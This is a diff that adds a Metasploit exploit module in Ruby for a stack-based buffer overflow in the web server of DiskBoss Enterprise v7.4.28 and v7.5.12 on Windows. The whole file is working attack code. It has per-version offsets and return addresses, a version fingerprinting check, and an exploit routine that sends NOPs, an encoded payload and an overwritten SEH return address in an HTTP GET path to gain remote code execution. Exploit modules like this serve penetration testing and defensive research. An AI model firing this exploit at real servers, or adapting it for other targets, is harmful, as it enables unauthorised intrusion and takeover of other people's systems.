@@ -1,0 +1,131 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Seh
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'DiskBoss Enterprise GET Buffer Overflow',
+      'Description'    => %q{
+          This module exploits a stack-based buffer overflow vulnerability
+        in the web interface of DiskBoss Enterprise v7.5.12 and v7.4.28,
+        caused by improper bounds checking of the request path in HTTP GET
+        requests sent to the built-in web server. This module has been
+        tested successfully on Windows XP SP3 and Windows 7 SP1.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'vportal',      # Vulnerability discovery and PoC
+          'Gabor Seljan'  # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['EDB', '40869']
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread'
+        },
+      'Platform'       => 'win',
+      'Payload'        =>
+        {
+          'BadChars'   => "\x00\x09\x0a\x0d\x20",
+          'Space'      => 2000
+        },
+      'Targets'        =>
+        [
+          [
+            'Automatic Targeting',
+            {
+              'auto' => true
+            }
+          ],
+          [
+            'DiskBoss Enterprise v7.4.28',
+            {
+              'Offset' => 2471,
+              'Ret'    => 0x1004605c  # ADD ESP,0x68 # RETN [libpal.dll]
+            }
+          ],
+          [
+            'DiskBoss Enterprise v7.5.12',
+            {
+              'Offset' => 2471,
+              'Ret'    => 0x100461da  # ADD ESP,0x68 # RETN [libpal.dll]
+            }
+          ]
+        ],
+      'Privileged'     => true,
+      'DisclosureDate' => 'Dec 05 2016',
+      'DefaultTarget'  => 0))
+  end
+
+  def check
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => '/'
+    )
+
+    if res && res.code == 200
+      if res.body =~ /DiskBoss Enterprise v7\.(4\.28|5\.12)/
+        return Exploit::CheckCode::Vulnerable
+      elsif res.body =~ /DiskBoss Enterprise/
+        return Exploit::CheckCode::Detected
+      end
+    else
+      vprint_error('Unable to determine due to a HTTP connection timeout')
+      return Exploit::CheckCode::Unknown
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    mytarget = target
+
+    if target['auto']
+      mytarget = nil
+
+      print_status('Automatically detecting the target...')
+
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri'    => '/'
+      )
+
+      if res && res.code == 200
+        if res.body =~ /DiskBoss Enterprise v7\.4\.28/
+          mytarget = targets[1]
+        elsif res.body =~ /DiskBoss Enterprise v7\.5\.12/
+          mytarget = targets[2]
+        end
+      end
+
+      if !mytarget
+        fail_with(Failure::NoTarget, 'No matching target')
+      end
+
+      print_status("Selected Target: #{mytarget.name}")
+    end
+
+    sploit =  make_nops(21)
+    sploit << payload.encoded
+    sploit << rand_text_alpha(mytarget['Offset'] - payload.encoded.length)
+    sploit << [mytarget.ret].pack('V')
+    sploit << rand_text_alpha(2500)
+
+    send_request_cgi(
+      'method' => 'GET',
+      'uri'    => sploit
+    )
+  end
+end
